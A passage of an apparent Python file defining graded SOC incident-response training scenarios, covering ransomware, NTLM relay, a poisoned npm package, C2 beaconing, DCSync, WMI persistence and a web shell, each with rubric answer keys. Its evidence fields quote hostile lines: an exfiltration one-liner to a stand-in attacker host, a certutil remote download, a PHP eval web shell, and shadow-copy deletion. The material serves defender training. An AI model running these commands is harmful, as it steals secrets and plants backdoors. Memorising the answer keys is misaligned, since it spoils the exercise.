            mitre=[
                {"id": "T1566.002", "name": "T1566.002 - Phishing: Spearphishing Link"},
                {"id": "T1528", "name": "T1528 - Steal Application Access Token"},
            ],
            responses=[
                {"id": "r-1", "name": "Revoke OAuth app consent tenant-wide, invalidate user refresh tokens, and restrict user app consent settings", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Reset local Windows workstation password only", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1566.002", "T1528"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Password resets do NOT revoke OAuth tokens.", "Check the permissions requested (Mail.ReadWrite).", "Revoke the application consent directly in Entra ID."],
            explanation="OAuth application consent was abused to grant persistent Graph API access. Revoke the application consent and block non-admin app grants.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-013",
            title="Early Containment: Canary File Modification Alert",
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            category=ScenarioCategory.INCIDENT_RESPONSE,
            description="File Integrity Monitoring triggers on hidden canary directory C:\\Canary\\*.docx being renamed to *.locked.",
            learning_objectives=["Leverage canary honeypot files for ransomware tripwires", "Evaluate ransomware encryption velocity", "Execute rapid network quarantine"],
            signal={"alert": "CANARY_TRIPWIRE_TRIGGERED", "file": "C:\\Canary\\financial_q3.docx.locked", "host": "ENG-SRV-02", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "Rapid File Renaming Sequence", "type": "FIM", "description": "Over 200 files encrypted and renamed within 4 seconds in user directories."},
                {"id": "ev-2", "name": "Volume Shadow Copy Deletion Command", "type": "PROCESS", "description": "vssadmin.exe Delete Shadows /All /Quiet executed by parent process srvhost.exe."},
                {"id": "ev-3", "name": "Distractor: Antivirus Signature Definition Update", "type": "DEFENDER", "description": "Definition file 1.385.120.0 downloaded."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Ransom note HOW_TO_DECRYPT.txt created on desktop"},
                {"id": "c-2", "name": "Distractor: Correlate with printer queue spooler restart"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Active ransomware outbreak in early encryption phase detected by canary tripwire"},
                {"id": "h-2", "name": "User running disk compression or 7-Zip archiving tool"},
            ],
            mitre=[
                {"id": "T1486", "name": "T1486 - Data Encrypted for Impact"},
                {"id": "T1490", "name": "T1490 - Inhibit System Recovery"},
            ],
            responses=[
                {"id": "r-1", "name": "Immediately isolate ENG-SRV-02 from network, kill encryptor process tree, and engage Incident Commander", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Pay the cryptocurrency ransom demand via corporate credit card", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1486", "T1490"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Canary file modification indicates early encryption.", "Notice vssadmin shadow copy deletion.", "Immediate network isolation prevents network share encryption."],
            explanation="Ransomware tripped the canary defense before spreading to mapped file shares. Immediate host isolation halted complete business disruption.",
        )
    )

    # =========================================================================
    # ADVANCED SCENARIOS (10)
    # =========================================================================
    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-014",
            title="Credential Theft: Pass-the-Hash & NTLM Relay",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.ENDPOINT_INVESTIGATION,
            description="Defender for Identity flags NTLM authentication to Exchange Server relaying credentials intercepted via LLMNR poisoning.",
            learning_objectives=["Detect LLMNR/NBT-NS poisoning and Responder artifacts", "Analyze NTLM authentication relaying", "Disable LLMNR and enforce SMB signing"],
            signal={"alert": "NTLM Relay Attack Suspected", "target": "EXCH-01", "source": "10.0.1.77", "protocol": "RPC/SMB", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "Network Packet Capture LLMNR Broadcasts", "type": "PCAP", "description": "Host 10.0.1.77 responding to all LLMNR/NetBIOS broadcast requests on subnet."},
                {"id": "ev-2", "name": "Event 4624 Type 3 Network Logon with NTLM", "type": "EVENT_LOG", "description": "Administrative account authenticated to Exchange via NTLM without Kerberos ticket."},
                {"id": "ev-3", "name": "Distractor: WINS Server Registration", "type": "NETWORK", "description": "Routine WINS name release from domain member."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Source machine had port 445 open running Python Responder script"},
                {"id": "c-2", "name": "Distractor: Correlate with Outlook calendar synchronization"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Adversary performed LLMNR poisoning and relayed intercepted NTLM hash to Exchange"},
                {"id": "h-2", "name": "Normal legacy application requiring NTLMv1 compatibility"},
            ],
            mitre=[
                {"id": "T1557.001", "name": "T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay"},
                {"id": "T1550.002", "name": "T1550.002 - Use Alternate Authentication Material: Pass the Hash"},
            ],
            responses=[
                {"id": "r-1", "name": "Isolate rogue host 10.0.1.77, push GPO disabling LLMNR/NBT-NS, and mandate SMB Signing", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Downgrade entire domain to NTLMv1 only", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1557.001", "T1550.002"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Notice the LLMNR broadcast responses.", "Examine why NTLM was accepted instead of Kerberos.", "Disable LLMNR and enforce SMB signing to eradicate."],
            explanation="The attacker used Responder to poison name resolution and relay credentials. Enforce SMB signing and disable LLMNR.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-015",
            title="Software Supply Chain: Compromised NPM Dependency",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.THREAT_INTELLIGENCE,
            description="Build pipeline alerts on npm package 'color-format-utils' containing a postinstall script exfiltrating AWS environment secrets.",
            learning_objectives=["Detect typosquatting / poisoned open source dependencies", "Analyze CI/CD runner execution logs", "Revoke compromised cloud access keys"],
            signal={"alert": "CI/CD Pipeline Dependency Anomaly", "package": "color-format-utils@2.4.1", "trigger": "POSTINSTALL_SCRIPT", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "package.json Postinstall Hook", "type": "CODE", "description": "node -e 'require(\"http\").request(\"http://exfil.attacker.sim/\"+btoa(JSON.stringify(process.env)))'"},
                {"id": "ev-2", "name": "CI/CD Runner Egress Network Log", "type": "NETWORK", "description": "Egress POST request transmitting AWS_SECRET_ACCESS_KEY from runner to exfil.attacker.sim."},
                {"id": "ev-3", "name": "Distractor: Docker Hub Base Image Pull", "type": "DOCKER", "description": "Pulling node:18-alpine official base container."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Package was published 2 hours before commit and hijacked maintainer account"},
                {"id": "c-2", "name": "Distractor: Correlate with Git merge conflict in README.md"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Supply chain compromise via malicious postinstall script exfiltrating cloud deployment secrets"},
                {"id": "h-2", "name": "Developer testing telemetry reporting library"},
            ],
            mitre=[
                {"id": "T1195.001", "name": "T1195.001 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools"},
                {"id": "T1552.001", "name": "T1552.001 - Unsecured Credentials: Credentials In Files"},
            ],
            responses=[
                {"id": "r-1", "name": "Revoke AWS IAM keys immediately, pin known safe dependency versions, and block malicious domain", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Commit the change to production master branch anyway", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1195.001", "T1552.001"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Examine the postinstall script in package.json.", "Notice process.env being exfiltrated.", "Rotate all cloud secrets accessible to that build runner."],
            explanation="A hijacked NPM dependency leaked CI/CD secrets. Immediately rotate cloud credentials and audit package lockfiles.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-016",
            title="C2 Beaconing: Malleable HTTP Profiles & Jitter",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.NETWORK_INVESTIGATION,
            description="Proxy analytics detect rhythmic HTTP POST requests every 60s (+/- 10% jitter) disguised as jQuery CDN telemetry.",
            learning_objectives=["Detect low-and-slow periodic beaconing", "Analyze malleable C2 URI / User-Agent headers", "Extract adversary sleep time and jitter parameters"],
            signal={"rule": "BEACON_PERIODICITY_MATCH", "destination": "code-cdn-telemetry.xyz", "interval": "60s (10% jitter)", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "Proxy Request Timing Histogram", "type": "PROXY", "description": "Rhythmic HTTP POSTs to /jquery/3.6.0/min.js with consistent cookie header length (128 bytes)."},
                {"id": "ev-2", "name": "Base64 Cookie Analysis", "type": "HTTP", "description": "Cookie value decrypts with XOR key to reveal internal system architecture and PID."},
                {"id": "ev-3", "name": "Distractor: Google Analytics Beacon", "type": "HTTP", "description": "Legitimate analytics.js tracking ping."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Host process svchost.exe injected with unbacked memory section"},
                {"id": "c-2", "name": "Distractor: Correlate with browser tab close event"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Cobalt Strike / Sliver C2 beaconing using malleable profile masquerading as jQuery"},
                {"id": "h-2", "name": "Legitimate frontend website heartbeat monitoring"},
            ],
            mitre=[
                {"id": "T1071.001", "name": "T1071.001 - Application Layer Protocol: Web Protocols"},
                {"id": "T1001.003", "name": "T1001.003 - Data Obfuscation: Protocol Impersonation"},
            ],
            responses=[
                {"id": "r-1", "name": "Block C2 domain at web proxy, dump process memory of injected host, and isolate system", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Ignore traffic because it mentions jQuery", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1071.001", "T1001.003"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Examine request periodicity and jitter in the histogram.", "Check if the cookie payload contains encrypted metadata.", "Isolate the host and capture memory."],
            explanation="The actor used malleable C2 profiles to disguise beacon traffic as jQuery requests. Block the domain and perform forensic memory analysis.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-017",
            title="Evasion: Process Hollowing in Explorer.exe",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.ENDPOINT_INVESTIGATION,
            description="EDR telemetry detects explorer.exe spawning cmd.exe and communicating with an unclassified remote IP.",
            learning_objectives=["Identify process hollowing / injection techniques", "Analyze memory permissions (PAGE_EXECUTE_READWRITE)", "Inspect thread call stacks for unbacked memory"],
            signal={"event": "SUSPICIOUS_MEMORY_UNBACKED", "process": "explorer.exe", "allocation_type": "PAGE_EXECUTE_READWRITE", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "VirtualAllocEx & WriteProcessMemory API Calls", "type": "EDR", "description": "Suspicious dropper svchost_fake.exe called SetThreadContext into suspended explorer.exe."},
                {"id": "ev-2", "name": "Unbacked Memory Region Call Stack", "type": "MEMORY", "description": "Call stack points to memory region 0x00400000 with no associated image file on disk."},
                {"id": "ev-3", "name": "Distractor: Explorer Desktop Redraw", "type": "SYSTEM", "description": "Standard GDI redraw event for desktop wallpaper."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Hollowed explorer.exe established socket connection to remote C2 IP"},
                {"id": "c-2", "name": "Distractor: Correlate with system clock synchronization"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Process hollowing executed into legitimate explorer.exe to evade process inspection"},
                {"id": "h-2", "name": "Windows Explorer shell extension crashing and restarting"},
            ],
            mitre=[
                {"id": "T1055.012", "name": "T1055.012 - Process Injection: Process Hollowing"},
            ],
            responses=[
                {"id": "r-1", "name": "Suspend and terminate compromised explorer.exe, isolate host, and extract volatile memory dump", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Reboot computer immediately destroying memory artifacts", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1055.012"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Look for SetThreadContext and WriteProcessMemory calls.", "Notice memory execution without backing on disk (unbacked).", "Memory dump must be captured before reboot."],
            explanation="The attacker hollowed explorer.exe to mask their malware under a trusted process. Take a memory dump and isolate the system.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-018",
            title="Infrastructure Hijack: BGP Route Anomaly & SSL Stripping",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.NETWORK_INVESTIGATION,
            description="BGP monitoring alerts show corporate /24 prefix announced by an unauthorized autonomous system (AS65000).",
            learning_objectives=["Detect BGP route hijacking anomalies", "Analyze traffic diversion and SSL downgrade attempts", "Coordinate upstream Tier-1 ISP route filtering"],
            signal={"alert": "BGP_PREFIX_HIJACK", "prefix": "198.51.100.0/24", "origin_as": "AS65000 (Unexpected)", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "BGP Route Announcement Logs", "type": "BGP", "description": "More-specific /24 route announced overriding legitimate /22 announcement from upstream ISP."},
                {"id": "ev-2", "name": "TLS Certificate Validation Errors", "type": "NETWORK", "description": "Users receiving invalid self-signed certificate warnings for corporate portal."},
                {"id": "ev-3", "name": "Distractor: Internal OSPF Neighbor Flap", "type": "ROUTER", "description": "Subnet router interface GigabitEthernet0/1 briefly flapped."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Diverted traffic was routed through offshore adversary proxy server"},
                {"id": "c-2", "name": "Distractor: Correlate with internal DHCP lease renewal"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Malicious BGP route hijack intercepting customer traffic for man-in-the-middle decryption"},
                {"id": "h-2", "name": "Legitimate multihoming failover test by corporate network engineers"},
            ],
            mitre=[
                {"id": "T1584.004", "name": "T1584.004 - Compromise Infrastructure: BGP Route Hijacking"},
                {"id": "T1557", "name": "T1557 - Adversary-in-the-Middle"},
            ],
            responses=[
                {"id": "r-1", "name": "Notify Tier-1 transit providers to filter rogue AS announcement and publish RPKI ROA validation", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Instruct users to click 'Ignore Certificate Warning' and proceed", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1584.004", "T1557"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["More-specific /24 routes win over /22 routes in BGP.", "Certificate errors confirm traffic interception.", "Deploy RPKI ROA and coordinate with upstream transit providers."],
            explanation="The attacker announced a more-specific BGP route to divert network traffic. Coordinate with upstream carriers to filter the rogue AS.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-019",
            title="Cloud Compromise: S3 Mass Exfiltration via Stolen Keys",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.THREAT_INTELLIGENCE,
            description="AWS CloudTrail alerts show API call GetObject executed 15,000 times in 10 minutes from a Tor exit IP.",
            learning_objectives=["Analyze CloudTrail S3 data event logs", "Detect anomalous API call frequency and geographic deviation", "Apply immediate IAM credential revocation"],
            signal={"event_name": "GetObject", "bucket": "corp-customer-pii-archive", "volume": "15,000 calls", "source_ip": "185.220.101.44", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "CloudTrail Log Records", "type": "CLOUDTRAIL", "description": "AccessKeyId AKIA... used to enumerate and download entire bucket from unauthorized foreign IP."},
                {"id": "ev-2", "name": "Public GitHub Commit Leak", "type": "INTEL", "description": "Key was accidentally committed to public GitHub repository 4 hours prior in config.py."},
                {"id": "ev-3", "name": "Distractor: CloudWatch Metric Alarm", "type": "CLOUDWATCH", "description": "CPU utilization on web-server-01 reached 65%."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Stolen key belonged to former developer who retained admin rights"},
                {"id": "c-2", "name": "Distractor: Correlate with S3 lifecycle rule transition to Glacier"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Exfiltration of sensitive customer data following public disclosure of AWS IAM secret keys"},
                {"id": "h-2", "name": "Automated data backup service syncing archives to secondary region"},
            ],
            mitre=[
                {"id": "T1552.001", "name": "T1552.001 - Unsecured Credentials: Credentials In Files"},
                {"id": "T1530", "name": "T1530 - Data from Cloud Storage"},
            ],
            responses=[
                {"id": "r-1", "name": "Delete compromised IAM access key immediately, attach explicit Deny bucket policy, and initiate breach disclosure", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Delete the entire S3 bucket and its data", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1552.001", "T1530"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Check where the key was leaked (GitHub public commit).", "High volume of GetObject calls indicates data exfiltration.", "Deactivate and delete the access key immediately."],
            explanation="The leaked IAM key was abused to scrape confidential cloud storage. Revoke the key, apply bucket restrictions, and audit accessed objects.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-020",
            title="Active Directory: DCSync Replication Abuse",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.SOC_INVESTIGATION,
            description="Replication directory changes requests (Event 4662) logged targeting Domain Controller from a non-DC workstation.",
            learning_objectives=["Detect DCSync (mimikatz / secretsdump) via Event 4662", "Audit Directory Replication Rights (DS-Replication-Get-Changes-All)", "Quarantine caller workstation"],
            signal={"event_id": 4662, "access_mask": "0x100", "properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}", "source_host": "DEV-WKS-12", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "Event 4662 with DS-Replication GUID", "type": "EVENT_LOG", "description": "GUID matches DS-Replication-Get-Changes-All invoked by user dev-bob from workstation IP."},
                {"id": "ev-2", "name": "Network RPC Calls to DRSUAPI Interface", "type": "PCAP", "description": "Direct RPC connection calling DsGetNCChanges requesting krbtgt NTLM password hash."},
                {"id": "ev-3", "name": "Distractor: DC-to-DC Replication Sync", "type": "AD", "description": "Normal scheduled replication between DC-01 and DC-02."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Workstation DEV-WKS-12 is not an authorized Domain Controller"},
                {"id": "c-2", "name": "Distractor: Correlate with DNS dynamic update"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "DCSync attack executed to extract all Active Directory password hashes without code execution on DC"},
                {"id": "h-2", "name": "New Domain Controller installation in progress by system admin"},
            ],
            mitre=[
                {"id": "T1003.006", "name": "T1003.006 - OS Credential Dumping: DCSync"},
            ],
            responses=[
                {"id": "r-1", "name": "Isolate DEV-WKS-12 immediately, disable dev-bob account, and prepare domain-wide KRBTGT password rotation (twice)", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Allow replication to finish then restart server", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1003.006"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Event 4662 with replication GUID from a non-DC is a DCSync signature.", "The attacker has obtained the KRBTGT hash.", "Double KRBTGT password reset is required."],
            explanation="The adversary abused replication privileges to extract all domain password hashes. Isolate the offending host and perform a double KRBTGT password reset.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-021",
            title="Living off the Land: WMI Event Consumer Persistence",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.ENDPOINT_INVESTIGATION,
            description="Sysmon Event 19, 20, 21 detect WmiEventFilter, WmiEventConsumer, and FilterToConsumerBinding created silently.",
            learning_objectives=["Analyze WMI repository persistence mechanisms", "Inspect CommandLineEventConsumer parameters", "Remove WMI namespace bindings"],
            signal={"event_id": 19, "consumer_name": "SCM_Event_Consumer", "command": "cmd.exe /c start /min certutil -urlcache -split -f http://evil.sim/a.exe", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "WMI FilterToConsumerBinding Registered", "type": "WMI", "description": "Binds system startup timer query to CommandLineEventConsumer executing certutil."},
                {"id": "ev-2", "name": "Certutil LOLBin Download Telemetry", "type": "PROCESS", "description": "certutil.exe invoked with -urlcache downloading remote executable bypassing browser filters."},
                {"id": "ev-3", "name": "Distractor: WMI Performance Adapter Query", "type": "WMI", "description": "Standard WMI query from PRTG Network Monitor gathering CPU stats."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Consumer executes as NT AUTHORITY\\SYSTEM upon user login"},
                {"id": "c-2", "name": "Distractor: Correlate with laptop battery level alert"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Stealthy persistence using WMI event subscription coupled with certutil LOLBin staging"},
                {"id": "h-2", "name": "Microsoft SCCM application deployment script"},
            ],
            mitre=[
                {"id": "T1546.003", "name": "T1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription"},
                {"id": "T1105", "name": "T1105 - Ingress Tool Transfer"},
            ],
            responses=[
                {"id": "r-1", "name": "Deregister WMI Event Consumer and Filter, purge dropped binary, and audit WMI repository", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Disable WMI service completely across corporate fleet breaking management tools", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1546.003", "T1105"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Sysmon 19, 20, 21 indicate WMI event subscription persistence.", "Notice certutil used as a Living-off-the-Land download binary.", "Remove the specific consumer and filter without breaking WMI."],
            explanation="The attacker leveraged WMI subscriptions for fileless persistence. Deregister the consumer binding and purge the staged malware.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-022",
            title="DMZ Breach: Zero-Day Web Shell on Reverse Proxy",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.INCIDENT_RESPONSE,
            description="NGINX error logs on DMZ proxy reveal memory corruption exploit followed by creation of stealth web shell in /usr/share/nginx/html.",
            learning_objectives=["Detect web shell droppers following memory corruption exploits", "Analyze web shell interactive commands (id, uname, whoami)", "Conduct forensics on reverse proxy infrastructure"],
            signal={"alert": "UNEXPECTED_FILE_DROP_DMZ", "file_path": "/usr/share/nginx/html/status_check.php", "size": "1,420 bytes", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "Web Shell Code Content", "type": "FILE", "description": "status_check.php executes eval(gzinflate(base64_decode($_POST['cmd'])))"},
                {"id": "ev-2", "name": "Interactive Command Execution in NGINX Log", "type": "HTTP", "description": "POST requests to status_check.php spawning child process /bin/sh executing 'whoami' and 'cat /etc/passwd'."},
                {"id": "ev-3", "name": "Distractor: NGINX Log Rotation", "type": "SYSTEM", "description": "logrotate executed for access.log."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Dropper IP traced to sophisticated adversary VPN pool"},
                {"id": "c-2", "name": "Distractor: Correlate with routine SSL certificate renewal"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Remote code execution on DMZ proxy resulting in interactive web shell persistence"},
                {"id": "h-2", "name": "Web development team deploying new health check diagnostic endpoint"},
            ],
            mitre=[
                {"id": "T1505.003", "name": "T1505.003 - Server Software Component: Web Shell"},
                {"id": "T1190", "name": "T1190 - Exploit Public-Facing Application"},
            ],
            responses=[
                {"id": "r-1", "name": "Quarantine web shell, isolate DMZ proxy, redeploy clean container image, and audit internal pivot points", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Leave shell active to observe what other commands attacker runs", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1505.003", "T1190"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Examine the PHP code using eval and base64_decode.", "Notice interactive shell execution in the logs.", "Redeploy the containerized proxy from verified code repository."],
            explanation="A zero-day exploit dropped a stealthy PHP web shell on the DMZ edge. Quarantine the file and redeploy the proxy from a verified golden image.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-023",
            title="Multi-Stage Campaign: Spearphishing to Domain Controller",
            difficulty=ScenarioDifficulty.ADVANCED,
            category=ScenarioCategory.INCIDENT_RESPONSE,
            description="SOC dashboard lights up with correlated alerts tracing initial malicious OneNote attachment to Domain Controller compromise.",
            learning_objectives=["Reconstruct end-to-end multi-stage attack lifecycle", "Correlate initial access, credential dumping, lateral movement, and privilege escalation", "Execute coordinated enterprise-wide containment"],
            signal={"incident": "ENTERPRISE_NETWORK_INTRUSION", "scope": "Multi-Host (WKST-01, FILE-01, DC-01)", "threat_actor": "APT-SIMULATED", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "Initial OneNote Attachment Delivery", "type": "EMAIL", "description": "invoice.one opened on WKST-01 executing embedded batch file."},
                {"id": "ev-2", "name": "LSASS Memory Dump via Procdump", "type": "ENDPOINT", "description": "procdump64.exe executed on FILE-01 extracting Domain Admin credentials."},
                {"id": "ev-3", "name": "Distractor: Nightly Database Re-indexing", "type": "SQL", "description": "Scheduled database index maintenance."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Compromised Domain Admin ticket used to access DC-01 administrative share"},
                {"id": "c-2", "name": "Distractor: Correlate with printer supplies reorder notification"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Full chain adversary intrusion progressing from phishing to domain compromise in 45 minutes"},
                {"id": "h-2", "name": "Multiple independent unrelated student lab tests"},
            ],
            mitre=[
                {"id": "T1566.001", "name": "T1566.001 - Phishing: Spearphishing Attachment"},
                {"id": "T1003.001", "name": "T1003.001 - OS Credential Dumping: LSASS Memory"},
                {"id": "T1078.002", "name": "T1078.002 - Valid Accounts: Domain Accounts"},
            ],
            responses=[
                {"id": "r-1", "name": "Isolate all impacted hosts, sever external C2 connectivity, invoke Incident Response Retainer, and initiate enterprise credential reset", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Reboot each computer one by one over the weekend", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1566.001", "T1003.001", "T1078.002"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Reconstruct the attack timeline step-by-step.", "Notice the progression from initial phishing to credential dumping to DC access.", "Enterprise-wide coordinated containment is required."],
            explanation="The actor executed a complete cyber kill chain from phishing to enterprise domain admin takeover. Coordinated containment and credential overhaul is required.",
        )
    )

    # =========================================================================
    # EXPERT SCENARIOS (5)
    # =========================================================================
    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-024",
            title="Firmware Threat: UEFI Bootkit & Hardware Rootkit",
            difficulty=ScenarioDifficulty.EXPERT,
            category=ScenarioCategory.ENDPOINT_INVESTIGATION,
            description="Hardware telemetry and Secure Boot log anomalies flag untrusted DXE driver executing before Windows Kernel initialization.",
            learning_objectives=["Detect pre-boot firmware tampering", "Analyze SPI flash integrity and TPM measured boot PCR values", "Recover from firmware-level compromise"],
            signal={"alert": "TPM_PCR0_INTEGRITY_MISMATCH", "host": "CORE-ROUTER-MGT", "measured_pcr": "0x4A8F... (Expected: 0x9B12...)", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "TPM PCR0 Measurement Violation", "type": "TPM", "description": "Platform Configuration Register 0 mismatch indicates unauthorized SPI flash firmware modification."},
                {"id": "ev-2", "name": "Malicious DXE Driver Extracted", "type": "FIRMWARE", "description": "Driver hooks Windows Boot Manager (bootmgfw.efi) to disable Driver Signature Enforcement in memory."},
                {"id": "ev-3", "name": "Distractor: CMOS Battery Voltage Level", "type": "HARDWARE", "description": "3.0V nominal battery output."},
            ],
            correlations=[
